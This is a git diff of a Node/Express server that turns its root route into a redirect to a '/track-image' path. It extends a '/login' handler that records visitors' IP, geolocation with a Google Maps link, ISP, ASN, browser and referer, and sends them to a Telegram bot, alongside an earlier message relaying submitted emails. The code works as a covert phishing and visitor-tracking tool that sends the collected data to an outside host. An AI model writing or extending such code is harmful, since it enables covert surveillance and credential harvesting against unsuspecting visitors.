@@ -13,8 +13,12 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "login.html"));
+  res.redirect("/track-image");
 });
+
+// app.get("/", (req, res) => {
+//   res.sendFile(path.join(__dirname, "login.html"));
+// });
 
 app.post("/login", async (req, res) => {
   const { email } = req.body;
@@ -54,22 +58,37 @@ app.post("/login", async (req, res) => {
     const referer = req.headers["referer"] || "Direct Link";
     const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
+    const locationLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
 
     const message = `
-📥 Login Attempt
-📧 Email: ${email}
-🌐 IP: ${ip}
-📍 Location: ${city}, ${regionName}, ${country} (${countryCode})
-🗺️ Lat: ${lat}, Lon: ${lon}
-🏢 ISP: ${isp}, Org: ${org}
-🕒 Time: ${timestamp}
-🧭 Timezone: ${timezone}
-💻 Device: ${userAgent}
-🌍 Language: ${language}
-🔗 Referer: ${referer}
-🔌 Connection: ${connection}
-🧑‍💻 Host: ${host}
+    📍 New Visitor Tracked:
+    IP: ${ip}
+    Country: ${data.country} (${data.countryCode})
+    Region: ${data.regionName}
+    City: ${data.city}
+    ZIP: ${data.zip}
+    🌐 Location: [Open Map](${locationLink})
+    Lat, Lon: ${data.lat}, ${data.lon}
+    Timezone: ${data.timezone}
+    ISP: ${data.isp}
+    Org: ${data.org}
+    ASN: ${data.as}
+    User-Agent: ${userAgent}
+    Language: ${language}
+    Referer: ${referer}
+    Timestamp: ${timestamp}
     `;
+
+    await axios.get(
+      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+      {
+        params: {
+          chat_id: telegramChatId,
+          text: message,
+          parse_mode: "Markdown",
+        },
+      }
+    );
 
     await axios.get(
       `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
